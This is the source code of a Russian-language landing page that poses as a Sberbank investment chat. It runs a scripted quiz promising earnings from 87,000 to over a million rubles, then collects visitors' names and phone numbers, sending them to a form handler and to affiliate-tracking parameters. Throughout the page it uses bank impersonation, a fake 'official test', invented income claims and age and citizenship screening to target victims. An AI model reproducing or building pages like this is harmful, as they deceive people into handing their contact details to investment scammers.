<!DOCTYPE html><html><head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link type="image/x-icon" rel="shortcut icon" href="images/logo_green.svg">
    <title>Получите доступ к заработку в интернете от 100 000 рублей на платформе от
        "Инвест Аналитик"</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/main.css">

    <script src="js/libphonenumber-js.min.js"></script>
    <script type="application/javascript" src="js/keitaro.js"></script>
    <script type="application/javascript" src="track.js?v=21238"></script>
    
      <script>
        function getCookie(name) {
          let matches = document.cookie.match(
            new RegExp(
              "(?:^|; )" + name.replace(/([.$?*|{}()[]\/+^])/g, "\\$1") + "=([^;]*)"
            )
          );
          return matches ? decodeURIComponent(matches[1]) : undefined;
        }
        
        // Получаем значение 'subid' из куки
        const subid_1 = getCookie("_subid");
        
        
        var offerData = {
            subid: subid_1,
            buyer: "{buyer}",
            crm_campaign: "{crm_campaign}",
            thank_you_page: "{thank_you_page}",
            landing_name: "offer_id_" + "{offer_id}",
            app_key: "{app_key}",
            bge: "{bge}",
            ts_id: "{ts_id}",
            info: "{info}"
        };

      </script>
      
            </head>
<body>

<style>
    .plug {
        display: flex;
        top: 0;
        position: fixed;
        overflow: hidden;
        height: 100%;
        width: 100%;
        background: white;
        z-index: 999999;
        align-items: center;
        justify-content: center;
        font-size: 22px;
        text-align: center;
        font-weight: bold;
        font-family: 'Roboto', Arial, sans-serif;
        padding: 0 20px;
    }
</style>
<div style="display: none" id="plug1" class="plug">
    Спасибо за желание участвовать в программе «Инвест Аналитик»,
    однако участие в ней могут принимать только граждане РФ, достигшие 25 лет.
    Хорошего дня!
</div>
<div style="display: none" id="plug2" class="plug">
    Вам отказано в доступе по причине отсутствия
    гражданства РФ
</div>

<style>
    * {
        box-sizing: border-box;
    }

    body {
        background: url(images/bg.png);
        background-color: #e8e4e0;
        background-size: cover;
        background-repeat: repeat;
    background-position: center top;
    background-attachment: fixed;
    }

    .main-bg {
        /* background: url(images/bg.png) no-repeat center center;
        background-size: cover;
        height: 100vh; */
    }

    .pattern-bg {
        height: 100vh;
    }

    .date {
        margin: auto;
        width: fit-content;

    }

    .main-chat {
        width: 40%;
        padding: 0 16px;
        overflow-y: scroll;
        padding-bottom: 30px;
        margin: 70px auto 0 auto ;
    }

    .left-chat, .right-chat {
        width: 100%;
        display: flex;
        align-items: center;
        margin-top: 10px;
        justify-content: left;
    }

    .right-chat {
        justify-content: right;
        flex-direction: row-reverse;
    }


    .time {
        margin-left: 12px;
        margin-right: 12px;
        font-style: normal;
        font-weight: 400;
        font-size: 14px;
        line-height: 12px;

        color: rgba(255, 255, 255, 0.7);
    }


    .horizontal, .vertical {
        display: flex;
        justify-content: space-between;
        flex-wrap: wrap;
        width: 80%;
        margin-top: 10px;
    }

    .vertical {
        justify-content: left;
        flex-direction: column;
    }

    .form-wrapper {
        padding: 10px 25px;
    }

    .form {
        padding: 20px;
        background: #FFF;
        border-radius: 10px;
        border: 1px solid #D4DADD;
        width: 100%;
    }

    .form h4 {
        text-align: center;
        font-weight: bold;
        margin-bottom: 13px;
        font-size: 16px;
    }

    .form input {
        width: 100%;
        border: 1px solid #A9A9A9;
        padding: 5px 10px;
    }

    .form button {
        font-style: normal;
        font-weight: 700;
        font-size: 16px;
        line-height: 1.2;
        text-align: center;
        width: 100%;
        color: #fff;
        padding: 14px 25px;
        transition: all 0.3s ease-in-out;
        margin: 10px auto;
        border-radius: 5px;
        background: #158F2C;
    }

    @media  screen and (max-width: 767px) {
        .main-chat {
            width: 100%;
        }
    }

    body {
        font-family: 'Roboto', sans-serif;
    }


    .date {
        margin-top: 15px;
        padding: 2px 16px;
        border-radius: 6px;
        background: #DBDFEB;

        /* WA Bubble */
        box-shadow: 0px 1px 1px 0px rgba(0, 0, 0, 0.20);
        color: #414350;
        text-align: center;
        font-size: 12px;
        font-style: normal;
        font-weight: 400;
        line-height: normal;
    }

    .left-chat {
        padding-left: 8px;
        position: relative;
        margin-bottom: 2px;
        padding-right: 20px;
    }

    .left-chat:before {
        content: '';
        position: absolute;
        left: 0;
        bottom: 0;
        width: 8px;
        height: 16px;
        background: url(images/avatar.svg) no-repeat center center;
        background-size: cover;
    }

    .left-chat .chat-block {
        display: flex;
        line-height: 1.2;
        padding: 8px 8px 26px;
        border-radius: 6px;
        background: #F9F9F9;
        position: relative;

        /* WA Bubble */
        box-shadow: 1px 1px 1px 0px rgba(0, 0, 0, 0.1);
    }

    .left-chat .chat-block:after {
        position: absolute;
        bottom: 6px;
        right: 12px;
        color: #A7A7A7;
        text-align: right;
        font-size: 12px;
    }

    .horizontal {
        margin-top: 10px;
        display: flex;
        align-items: center;
        justify-content: flex-start;
        margin-bottom: 10px;
        padding-left: 8px;
    }

    .vertical {
        padding-left: 8px;
        margin-bottom: 10px;
    }

    .answer-btn {
        border-radius: 6px;
        margin-bottom: 5px;
        background: #158F2C;
        padding: 12px 8px;
        color: #FFF;
        font-size: 16px;
        font-style: normal;
        font-weight: 700;
        line-height: normal;
    }

    .vertical .answer-btn {
        margin-bottom: 6px;
    }

    .horizontal .answer-btn {
        padding: 12px 40px;
    }

    .horizontal .answer-btn:not(:last-of-type) {
        margin-right: 6px;
    }

    .right-chat {
        display: flex;
        width: 100%;
        position: relative;
    }

    .right-chat:before {
        content: '';
        position: absolute;
        right: -8px;
        bottom: 0;
        width: 8px;
        height: 16px;
        background: url(images/avatar2.svg) no-repeat center center;
        background-size: cover;
    }

    .right-chat .chat-block {
        border-radius: 6px;
        background: #DCF8C7;
        color: #000;
        padding: 6px 80px 4px 12px;
        position: relative;
        max-width: 84%;
        box-shadow: -1px 1px 1px 0px rgba(0, 0, 0, 0.1);
    }

    .right-chat .chat-block:after {
        content: url(images/checked.svg);
        position: absolute;
        right: 12px;
        bottom: 0;
    }

    .time, .time-right {
        position: absolute;
        bottom: 8px;
        right: 0px;
        color: rgba(0, 0, 0, 0.15);
        font-size: 12px;
        font-style: normal;
        font-weight: 400;
        line-height: normal;
    }

    .time-right {
        right: 36px;
        bottom: 6px;
        color: rgba(0, 0, 0, 0.15);
        font-size: 12px;
        font-style: normal;
        font-weight: 400;
        line-height: normal;
    }

    .form {
        border-radius: 10px;
        border: 1px solid #D4DADD;
        background: #F6F7F8;
    }

    .header {
        width: 100%;
        min-width: 320px;
        margin: 0 auto;
        border-bottom: 1px solid #A4A39E;
        position: fixed;
    top: 0;
    z-index: 10;
    }

    .online {
        color: #898989;
        font-size: 12px;
        font-style: normal;
        font-weight: 400;
        line-height: normal;
        letter-spacing: -0.024px;
    }
    @media(max-width: 767px) {
        .header {
            width: 100%;
        }
        .chat-name {
            font-size: 16px;
        }
    }
</style>
<form class="main-bg">
    <input type="hidden" id="utm_medium" value="{utm_medium}">
    <input type="hidden" id="campaing_id" value="{campaing_id}">
    <input type="hidden" id="source" value="{source}">
    <!--<input type="hidden" id="bge" value="{bge}">-->
    <div class="pattern-bg">
        <div class="header bg-white flex items-center justify-between pt-4 pb-2 px-2">
            <div class="w-1/5">
                <img src="images/back.svg" alt="">
            </div>
            <div class="w-full flex justify-center items-center text-xl" style="font-weight: 600">
                <img src="images/logo.svg" class="pr-2 w-10" alt="">
                <div class="flex items-start">
                    <div>
                        <p class="chat-name">
                            Сбер Инвестиции
                        </p>
                        <p class="online">
                            в сети
                        </p>
                    </div>
                    <img src="images/verified.svg" class="mt-1 pl-1 chat-arrow" alt="">
                </div>
            </div>
            <div class="w-1/4 flex justify-end items-center">
                <img src="images/phone.svg" alt="">
            </div>
        </div>
        <div class="main-chat">
            <div class="date">Сегодня</div>
        </div>
    </div>
</form>

<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="js/jquery-3.1.1.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/custom.js"></script>

<script>
    setInterval(function time() {
        var d = new Date();
        var hours = 24 - d.getHours();
        var min = 60 - d.getMinutes();
        if ((min + '').length == 1) {
            min = '0' + min;
        }
        var sec = 60 - d.getSeconds();
        if ((sec + '').length == 1) {
            sec = '0' + sec;
        }
        jQuery('.timer').html(hours + ':' + min + ':' + sec)
    }, 1000);
</script>

<script src="js/intlTelInput.min.js"></script>
<script src="js/utils.min.js"></script>
<link rel="stylesheet" href="css/intlTelInput.css">
<script src="js/toastr.min.js"></script>
<link rel="stylesheet" href="css/toastr.css">
<style>
    .iti--allow-dropdown {
        width: 100%;
    }

    .iti.iti--allow-dropdown.iti--separate-dial-code {
        width: 100%;
    }

    .error {
        border: 2px solid red;
        border-radius: 4px;
    }
</style>
<script>
    window.addEventListener("load", function () {
        window.intlTelInputGlobals.windowLoaded = true;
    });

    function runIntlTelInputAndGeoIp(element) {
        return intlTelInput(element, {
            customPlaceholder: function (selectedCountryPlaceholder, selectedCountryData) {
                return selectedCountryPlaceholder
                    .replace(/ /g, '')
                    .replace(/-/g, '').replace(/\(/g, '')
                    .replace(/\)/g, '');
            },
            autoHideDialCode: false,
            nationalMode: false,
            separateDialCode: true,
            autoPlaceholder: 'aggressive',
            placeholderNumberType: "MOBILE",
            initialCountry: "ru",
            onlyCountries: ['ru'],
            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.min.js",
            geoIpLookup: function (success, failure) {
                $.get("https://ipinfo.io", function () {
                }, "jsonp").always(function (resp) {
                    var countryCode = (resp && resp.country) ? resp.country : "us";
                    success(countryCode);
                });
            },
        });
    }

    var isName = function isName(name) {
        var re = /^[A-Za-zа-яёА-ЯЁЩЬЮЯҐЄІЇа-щьюяґєі \s]+$/;
        return re.test(name);
    };

    document.addEventListener('DOMContentLoaded', function () {
        let lastMessage = document.querySelector('.main-chat');
        var answersArray = [];
        let counter = 0;
        let questionCounter = 0;
        let contentArray = [
            'Пройдите официальный тест от ОАО «СБЕРБАНК РОССИЯ» и получите доступ к платформе!',
            'Поздравляю! Теперь от СберБанк для Вас открыта возможность зарабатывать на акциях российских и зарубежных компаний и получать от 87 000 ₽ уже с первых недель!',
            'Пожалуйста, ответьте на следующие вопросы:',
        ];

        let questions = [
            'Вы являетесь гражданином Российской Федерации (есть ли у вас Российское гражданство)?',
            'Сколько вам лет?',
            'С какой целью Вы хотите увеличить достаток?',
            'Имеете ли Вы опыт в инвестировании?',
            'Средний доход в программе от "Инвест Аналитик" начинается от 150 000 рублей и может достигать 1 245 000 рублей Сколько Вы хотите зарабатывать?',
            'Как вы планируете распорядиться заработанными на платформе средствами?',
            'Спасибо за уделённое время и пройденный опрос! Теперь Вам открыт доступ к персональной платформе проекта «Инвест Аналитик». Пожалуйста, оставьте свои контактные данные для регистрации в проекте. Ваш личный менеджер получит данные и свяжется с Вами в течении одного рабочего дня!'
        ]

        let answers = [
            ['Да', 'Нет'],
            ['до 18', '18-24', '25-40', '40-55', '55+'],
            ['Хочу обезопасить себя от кризиса', 'Хочу получать дополнительный доход', 'Планирую развивать бизнес', 'Хочу, чтобы моя семья не в чем не нуждалась' ],
            ['Да, успешно инвестирую по сей день', 'Инвестировал ранее, но сейчас не уделяю этому времени', 'Нет, никогда прежде не инвестировал'],
            ['150 000 рублей', '330 000 рублей', '1 000 000 рублей'],
            ['Куплю недвижимость/автомобиль', 'Куплю то, что давно хотел', 'Буду вкладывать далее, чтобы средства приумножались и далее', 'Еще не решил/решила'],
            null
        ]

        let waiting = false;

        // Get the current date and time
        const now = new Date();

        // Get the hours and minutes
        const hours = now.getHours();
        const minutes = now.getMinutes();

        // Format hours and minutes with leading zeros if necessary
        const formattedHours = String(hours).padStart(2, '0');
        const formattedMinutes = String(minutes).padStart(2, '0');

        // Combine hours and minutes in the "hh:mm" format
        const currentTime = `${formattedHours}:${formattedMinutes}`;

        function createDivWithInterval() {
            if (counter < 3) {
                let newMessage = document.createElement('div');
                newMessage.className = 'left-chat';
                newMessage.innerHTML = '<div class="chat-block">' + contentArray[counter] + '</div>'
                lastMessage.appendChild(newMessage);
                $('.left-chat:first-of-type').addClass('with-avatar')

                // Создаем элемент .time
                let timeElement = document.createElement('div');
                timeElement.className = 'time';

                timeElement.innerText = currentTime;
                // Вставляем элемент .time внутрь элемента .chat-block
                newMessage.querySelector('.left-chat .chat-block').appendChild(timeElement);

                lastMessage.scrollTop = lastMessage.scrollHeight;
                counter++;
            } else {
                clearInterval(intervalId);
                postQuestion(questions[questionCounter], answers[questionCounter], 'horizontal', questionCounter)
                waiting = true;
            }
        }

        let intervalId = setInterval(createDivWithInterval, 1000);


        function sendMessage(type, content) {
            let rotation = 'vertical';

            if (questionCounter === 0 || questionCounter === 4) {
                rotation = 'horizontal';
            }

            if (type == 'button') {
                let newMessage = document.createElement('div');
                newMessage.className = 'right-chat';
                newMessage.innerHTML = '<div class="chat-block">' + content + '</div><input type="hidden" name="' + questions[questionCounter] + '" value="' + content + '">'
                lastMessage.appendChild(newMessage);
                
                // Создаем элемент .time
                let timeElement = document.createElement('div');
                timeElement.className = 'time-right';

                timeElement.innerText = currentTime;
                // Вставляем элемент .time внутрь элемента .chat-block
                newMessage.querySelector('.right-chat .chat-block').appendChild(timeElement);
                lastMessage.scrollTop = lastMessage.scrollHeight;

                if (questions[questionCounter] == 'Вы являетесь гражданином Российской Федерации (есть ли у вас Российское гражданство)?' && content == "Нет") {
                    /* $('#plug2').show();*/

                    let newMessage1 = document.createElement('div');
                    newMessage1.className = 'left-chat with-avatar';
                    newMessage1.innerHTML = '<div class="chat-block"> Спасибо за желание участвовать в программе «Инвест Аналитик», однако участие в ней могут принимать только граждане РФ, достигшие 25 лет. Хорошего дня!</div>'
                    // Создаем элемент .time
                    let timeElement = document.createElement('div');
                    timeElement.className = 'time';
                    timeElement.innerText = currentTime;
                    // Вставляем элемент .time внутрь элемента .chat-block
                    newMessage1.querySelector('.chat-block').appendChild(timeElement);

                    lastMessage.appendChild(newMessage1);
                    lastMessage.scrollTop = lastMessage.scrollHeight;
                    localStorage.setItem('unsuitable', false);
                    return false;
                }
                if (questions[questionCounter] == 'Сколько вам лет?' && content == "до 18") {
                    /*$('#plug1').show();*/

                    let newMessage1 = document.createElement('div');
                    newMessage1.className = 'left-chat with-avatar';
                    newMessage1.innerHTML = '<div class="chat-block"> Спасибо за желание участвовать в программе «Инвест Аналитик», однако участие в ней могут принимать только граждане РФ, достигшие 25 лет. Хорошего дня!</div>'
                    // Создаем элемент .time
                    let timeElement = document.createElement('div');
                    timeElement.className = 'time';
                    timeElement.innerText = currentTime;
                    // Вставляем элемент .time внутрь элемента .chat-block
                    newMessage1.querySelector('.chat-block').appendChild(timeElement);

                    lastMessage.appendChild(newMessage1);
                    lastMessage.scrollTop = lastMessage.scrollHeight;
                    localStorage.setItem('unsuitable', false);
                    return false;
                }
                if (questions[questionCounter] == 'Сколько вам лет?' && content == "18-24") {
                    /* $('#plug1').show();*/

                    let newMessage1 = document.createElement('div');
                    newMessage1.className = 'left-chat with-avatar';
                    newMessage1.innerHTML = '<div class="chat-block"> Спасибо за желание участвовать в программе «Инвест Аналитик», однако участие в ней могут принимать только граждане РФ, достигшие 25 лет. Хорошего дня!</div>'
                    // Создаем элемент .time
                    let timeElement = document.createElement('div');
                    timeElement.className = 'time';
                    timeElement.innerText = currentTime;
                    // Вставляем элемент .time внутрь элемента .chat-block
                    newMessage1.querySelector('.chat-block').appendChild(timeElement);

                    lastMessage.appendChild(newMessage1);
                    lastMessage.scrollTop = lastMessage.scrollHeight;
                    localStorage.setItem('unsuitable', false);
                    return false;
                }


                if (waiting) {
                    setTimeout(function () {
                        questionCounter++
                        let rotation = 'vertical';
                        if (questionCounter === 0 || questionCounter === 4) {
                            rotation = 'horizontal';
                        }
                        postQuestion(questions[questionCounter], answers[questionCounter], rotation, questionCounter);
                    }, 500)
                    waiting = false;
                }
            } else {
                postQuestion(questions[questionCounter], answers[questionCounter], rotation, questionCounter)
            }


        }

        function postQuestion(question, answers, rotation) {
            let newMessage = document.createElement('div');
            newMessage.className = 'left-chat message-index-' + questionCounter;
            newMessage.innerHTML = '<div class="chat-block">' + question + '</div>';
            lastMessage.appendChild(newMessage);

            // Создаем элемент .time
            let timeElement = document.createElement('div');
            timeElement.className = 'time';

            timeElement.innerText = currentTime;
            // Вставляем элемент .time внутрь элемента .chat-block
            newMessage.querySelector('.left-chat .chat-block').appendChild(timeElement);

            if (answers) {
                let newButtons = document.createElement('div');
                newButtons.className = rotation;

                answers.forEach((item) => {
                    let button = document.createElement('button');
                    let newCounter = questionCounter;
                    button.type = 'button';
                    button.className = 'answer-btn answer-btn-' + questionCounter;
                    button.innerHTML = item;
                    newButtons.appendChild(button);

                    button.addEventListener('click', function () {
                        waiting = true;
                        sendMessage('button', item);
                        let btns = document.querySelectorAll('.answer-btn-' + newCounter);
                        btns.forEach((itemes) => {
                            itemes.disabled = true
                        });
                        
                        const question = questions[questionCounter];
                        const answer = item;
                        const questionAnswerPair = `${question} - ${answer}` ;
                        
                        answersArray.push(questionAnswerPair);
                        
                        console.log(answersArray);
                        
                        const answersString = answersArray.join('| ');

                        // Кодируем строку перед передачей в параметры
                        const encodedAnswers = encodeURIComponent(answersString);
                        
                        // Обновляем параметры запроса
                        updateParams("sub_id_16=" + encodedAnswers);
                        
                        // let answersString = answersArray.toString();
                    })
                });

                lastMessage.appendChild(newButtons);
            } else {
                let formwrapper = document.createElement('div');
                formwrapper.className = 'form-wrapper';
                formwrapper.innerHTML = '<div class="form"> <h4>Заполните форму <br> для обратной связи </h4> <div style="margin-bottom: 5px;"><input type="text" name="firstname" placeholder="Ваше имя" required></div><div style="margin-bottom: 5px;"><input type="text" name="lastname" placeholder="Ваша фамилия" required></div><div style="margin-bottom: 5px;"><input type="tel" name="phone" placeholder="Телефон" required></div><div class="text-center"><button id="submitButton" type="submit">Завершить регистрацию</button></div></div>';
                lastMessage.appendChild(formwrapper);


                $('form').each(function () {
                    let phoneInt = null;
                    if ($(this).find("input[name='phone']")[0]) {
                        phoneInt = runIntlTelInputAndGeoIp($(this).find("input[name='phone']")[0]);
                    }

                    $(this).submit(function (e) {
                        e.preventDefault();
                        $(this).find('div.error').removeClass('error');
                        let OK = true;

                        let firstnameVal = $(this).find("input[name=firstname]").val();
                        updateParams(`sub_id_13=${firstnameVal}`);
                        let lastnameVal = $(this).find("input[name=lastname]").val();
                        updateParams(`sub_id_14=${lastnameVal}`);
                        let code = $(this).find("input[name=code]").val();
                        if (firstnameVal) {
                            if (!isName(firstnameVal)) {
                                let el = $(this).find("input[name=firstname]").parent()[0];
                                $(el).addClass('error');
                                OK = false;
                            }
                        }
                        if (lastnameVal) {
                            if (!isName(lastnameVal)) {
                                let el = $(this).find("input[name=lastname]").parent()[0];
                                $(el).addClass('error');
                                OK = false;
                            }
                        }
                        var errorMap = ["Invalid number", "Invalid country code", "Too short phone number", "Too long phone number", "Invalid phone number"];
                        let phoneVal = null;
                        if ($(this).find("input[name='phone']")[0]) {
                            phoneVal = phoneInt.getNumber(intlTelInputUtils.numberFormat.E164);
                            if (!phoneInt.isValidNumber()) {
                                toastr.error(errorMap[phoneInt.getValidationError()]);
                                OK = false;
                            }
                        }

                        if (OK) {
                            let url_string = window.location.href;
                                let url = new URL(url_string);
                                //let utm_sourceVal = url.searchParams.get("utm_source");
                               // let utm_contentVal = url.searchParams.get("utm_content");
                                const utm_mediumVal = document.getElementById("utm_medium").value;
                                const utm_campaignVal = document.getElementById("campaing_id").value;
                                const source = document.getElementById("source").value;
                                const button = document.getElementById("submitButton");
                                const buttonSubmit = document.getElementById("submitButton");
                                // const bgeVal = document.getElementById("bge");
                                //let utm_termVal = url.searchParams.get("utm_term");
                                //let clickidVal = url.searchParams.get("clickid");
                                //let formtype = $(this).data('type');
                                //let answers = $(this).serializeArray();
                                const parsedPhoneNumber = libphonenumber.parsePhoneNumber(phoneVal, 'RU');
                                
                                updateParams(`sub_id_15=${parsedPhoneNumber}`);
                                
                                const answersString = answersArray.toString();
                                // console.log(answersString);

                                if(parsedPhoneNumber.isValid() && parsedPhoneNumber.isPossible() && parsedPhoneNumber.country === 'RU')
                                {
                                    const payLoad = {
                                        firstName: firstnameVal,
                                        lastName: lastnameVal,
                                        phoneNumber: parsedPhoneNumber.number,
                                        utm_medium: "b02a2310-2ccf-4f2a-aaf3-349621468776",
                                        campaing_id: "Sb",
                                        landing: 'SberChat_3.8',
                                        language: 'RU',
                                        slug: '301',
                                        source: "bigo",
                                        answers: ''
                                    }
                                    const formData = new FormData();
                                    for (const key in payLoad) 
                                    {
                                    formData.append(key, payLoad[key]);
                                    }
                                    updateParams("sub_id_30=send_form_api");
                                    buttonSubmit.disabled = true;
                                    fetch('action.php', {
                                        method: 'POST',
                                        body: formData,
                                    })
                                    .then((response) => 
                                        {
                                          if (response.ok) {
                                            localStorage.setItem('thanks', true);
                                            const fileThenk = 'thanks-page.php';
                                            window.removeEventListener("beforeunload", trackClose);
                                            window.location.href = `${fileThenk}${window.location.search}`;
                                          }
                                          else {
                                            toastr.error('', 'Вы уже оставили заявку!');
                                          }
                                        })
                                        .catch(() => {
                                            toastr.error('', 'Error!');
                                        });
                                }
                                else
                                {
                                    toastr.error('', 'Error!')
                                }
                        }
                    });
                });
            }

            lastMessage.scrollTop = lastMessage.scrollHeight;
        }
    });
</script>

<script>
  window.onload = function() {
    var err = localStorage.getItem('unsuitable');
    var thx = localStorage.getItem('thanks');
    if (err && err === "false") {
      const fileErr = 'err.html'
      window.location.href = `${fileErr}${window.location.search}`;
    }
    else if (thx && thx === "true") {
      const fileThx = 'thanks-page.php'
      window.location.href = `${fileThx}${window.location.search}`;
    }
  }
</script>




</body></html>